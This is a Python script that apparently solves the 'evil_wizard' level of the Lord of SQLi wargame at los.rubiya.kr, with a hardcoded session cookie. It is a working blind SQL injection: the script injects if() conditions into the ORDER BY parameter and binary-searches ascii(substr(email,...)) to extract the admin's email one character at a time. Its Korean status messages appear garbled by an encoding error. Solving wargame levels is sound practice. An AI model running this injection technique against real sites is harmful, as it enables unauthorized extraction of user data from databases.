import requests

def send(param):
    url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
    cookie = "tp0ja8gkvp5j75fm5lntqomope"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("ð LoS 24ë¥¼ ììí©ëë¤")

for num in range(0,100):
    param=f"?order=if(id='admin' and length(email)={num}, '1 ASC', '1 DESC')"
    if("50</td></tr><tr><td>rubiya" in send(param)):
        print(f"ð emailì ê¸¸ì´ë {num}ìëë¤!")
        break

ans=""

for len in range(1, num+1):
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        param=f"?order=if(id='admin' and ascii(substr(email,{len},1))>={middle}, '1 ASC', '1 DESC') %23"
        if("50</td></tr><tr><td>rubiya" in send(param)):
            param=f"?order=if(id='admin' and ascii(substr(email,{len},1))={middle}, '1 ASC', '1 DESC') %23"
            if("50</td></tr><tr><td>rubiya" in send(param)):
                print(f"{len}ë²ì§¸ ë¬¸ì â {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue

print(f"ð emailì ì ì²´ë [{ans}]ìëë¤!")
